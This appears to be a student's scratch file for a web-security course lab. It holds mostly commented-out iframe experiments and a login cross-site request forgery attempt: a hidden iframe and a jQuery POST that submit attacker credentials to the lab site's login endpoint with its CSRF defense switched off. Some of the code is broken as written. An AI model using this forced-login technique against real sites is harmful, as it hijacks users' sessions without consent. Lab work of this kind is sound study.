frames[0].window.foo = function(){
   console.log ("Look at me, executed inside an iframe!", window);
}

/*
var iframe = document.getElementById('frameID'),
    iframeWin = iframe.contentWindow || iframe,
    iframeDoc = iframe.contentDocument || iframeWin.document;

window.hello = function () {
    alert('hello from owner!');
};

$(iframeDoc).ready(function (event) {
    iframeDoc.open();
    iframeDoc.write('iframe here');
    iframeDoc.write('\<script>alert("hello from iframe!");\<\/script>');
    iframeDoc.write('\<script>parent.hello();\<\/script>');
    iframeDoc.close();
	});


<!--
<iframe id="frameId" >
    <!-- <script>
        document.getElementById("username").value = "attacker"
        document.getElementById("userpass").value = "l33th4x"
        document.getElementById("log-in-btn").click()
</script>

<body>

<h1>Hello</h1>
<iframe src="https://project2.ecen4133.org/"> </iframe>
<p>Bungle Above</p>

<iframe src="https://project2.ecen4133.org/" id="my-iframe"></iframe>
<script src="script.js"></script>
 
</body>
</html>


<iframe src="https://project2.ecen4133.org/login?csrfdefense=0&xssdefense=4" style="visibility: hidden;">
    <script>
        $(document).ready(function(){
            console.log('sending data to server with login info')
            $.post('https://project2.ecen4133.org/login?csrfdefense=0&xssdefense=4', { "username": "attacker", "password": "l33th4x" })
        })
    </script>
</iframe>

<script>
    $(document).ready(function(){
        let iframe = document.getElementById('frameID')
        let iframeDoc = iframe.contentDocument
        $(iframeDoc).ready(function (event) {
            iframeDoc.open();
            iframeDoc.write('\<script>alert("hello from iframe!");\<\/script>');
            iframeDoc.write('\<script>parent.hello();\<\/script>');
            iframeDoc.close();
        });
    });
</script>
-->
*/